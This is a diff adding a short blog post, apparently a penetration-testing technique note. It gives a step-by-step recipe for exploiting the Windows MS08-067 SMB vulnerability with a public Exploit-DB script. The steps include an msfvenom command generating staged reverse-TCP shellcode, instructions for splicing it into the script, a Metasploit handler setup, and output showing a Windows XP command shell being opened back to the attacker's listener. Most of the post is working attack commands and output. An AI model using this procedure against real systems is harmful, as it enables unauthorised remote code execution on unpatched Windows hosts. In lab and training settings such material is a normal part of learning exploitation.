@@ -1,0 +1,76 @@
+---
+title:  "MS08-067 - DIY Script"
+date:   2021-08-05 21:15:00 +0100
+categories: [techniques]
+tags: [windows, scripts, ms08-067]
+comments: true
+---
+
+MS08-067 - Without Mimikatz Script
+==================================
+
+Exploiting MS08-067 without using metasploit.   
+
+This has been quite tricky to get working, but in summary from my experience, you cant use 'nc' as a listener for this because the payload needs to be STAGED and 'nc' will only catch STAGELESS payloads.
+
+
+First download the Python Script from here - [MS08_067](https://www.exploit-db.com/raw/40279 'MS08-067')
+
+Next run msfvenom with the arguments to suit your needs:
+
+`msfvenom -p windows/shell/reverse_tcp LHOST=x.x.x.x LPORT=8080  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode --arch x86 --platform windows`
+
+Next, replace the shell code in the python script with the shell code you have just created with msfvenom.
+
+Note - LEAVE THE FIRST THREE LINES (NOPS) IN THE PYTHON SCRIPT.
+Lines, 47, 48, 49
+
+
+`shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"`
+`shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"`
+`shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"`   
+`---ENTER SHELLCODE HERE ---`
+
+Next make a note of the Operating System & Service Pack that your are trying to execute. 
+There are 7 options to choose from:
+
+1.   Windows XP SP0/1 Universal   
+2.   Windows 2000 Universal   
+3.   Windows 2003 SP0 Universal   
+4.   Windows 2003 SP1 English   
+5.   Windows XP SP3 French (NX)   
+6.   Windows XP SP3 English (NX)   
+7.   Windows XP SP3 English (AlwaysOn NX)   
+
+Next -  Start Metasploit and setup a handler   
+    use exploit/multi/handler   
+    set LHOST X.X.X.X   
+    set LPORT XXXX   
+    set payload windows/shell/reverse_tcp   
+    exploit -j   
+
+Next execute the python script using the correct number that relates to the OS and Service Pack liek so.
+
+
+    python 40279.py 1
+
+You should see the reverse shell returned.
+
+    msf exploit(multi/handler) > exploit 
+
+    [*] Started reverse TCP handler on X.X.X.X:8080 
+    [*] Encoded stage with x86/shikata_ga_nai
+    [*] Sending encoded stage (267 bytes) to A.A.A.A
+    [*] Command shell session 10 opened (X.X.X.X:8080 -> A.A.A.A:1219) at 2017-02-00 15:55:22 +0000
+
+    Microsoft Windows XP [Version 5.1.2600]
+    (C) Copyright 1985-2001 Microsoft Corp.
+
+    C:\WINDOWS\system32>
+
+
+![img-description](/images/ms08-067.png)
+_For Reference this is what the traffic looks like for a successful reverse TCP connection for this particular exploit._
+
+
+
